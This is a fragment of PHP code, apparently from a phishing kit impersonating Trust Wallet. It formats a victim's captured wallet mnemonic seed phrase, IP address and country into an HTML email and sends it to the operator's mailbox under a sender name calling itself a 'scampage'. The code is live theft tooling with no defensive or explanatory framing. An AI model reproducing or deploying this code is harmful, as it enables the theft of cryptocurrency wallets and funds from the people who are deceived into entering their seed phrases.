...
$to = "$yourmail";
$subject = "🤑 Trust Wallet Memonic Phrase 🤑 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font style='color: #0a5d00;'>🔥 Trust Wallet Mnemonic Phrase </font><br>
<font style='color:#9c0000;'>📌</font> Memonic Phrase = <font style='color:#0070ba;'>$walletSeed</font><br>
...
$headers .= 'From:🌼🤑 Memonic Phrase 🤑 <priv8scampage@rez.com>' . "\r\n";
